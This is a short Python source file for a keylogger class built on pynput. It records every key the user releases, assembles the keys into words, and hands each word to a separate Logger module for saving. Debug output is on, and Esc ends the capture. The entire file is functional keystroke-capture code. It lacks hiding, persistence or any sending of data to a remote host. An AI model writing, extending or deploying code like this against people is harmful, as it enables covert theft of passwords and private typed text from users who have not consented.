from logger import Logger
from pynput import keyboard


class Keylogger:
    letter_que = ""
    debug = True

    def __init__(self):
        self.listener = keyboard.Listener(on_release=self.on_release)
        self.logger = Logger()

    def start(self):
        self.listener.start()

    def on_press(self, key):
        try:
            print("alphanumeric key {0} pressed".format(key.char))
        except AttributeError:
            print("special key {0} pressed".format(key))

    def on_release(self, key):
        if hasattr(key, "char"):
            char = key.char
            self.letter_que += char
            return
        if key == keyboard.Key.backspace:
            self.letter_que = self.letter_que[: len(self.letter_que) - 1]

        if key == keyboard.Key.space or key == keyboard.Key.enter:
            if self.debug:
                print(f"word over '{self.letter_que}'")
            if key == keyboard.Key.space:
                self.letter_que += " "
            if key == keyboard.Key.enter:
                self.letter_que += "\n"
            self.logger.save_word(self.letter_que)
            self.letter_que = ""

        if self.debug:
            print(f"{key} released current que {self.letter_que}")
        if key == keyboard.Key.esc:
            print(self.logger.tmp_log)
            # Stop listener
            return False
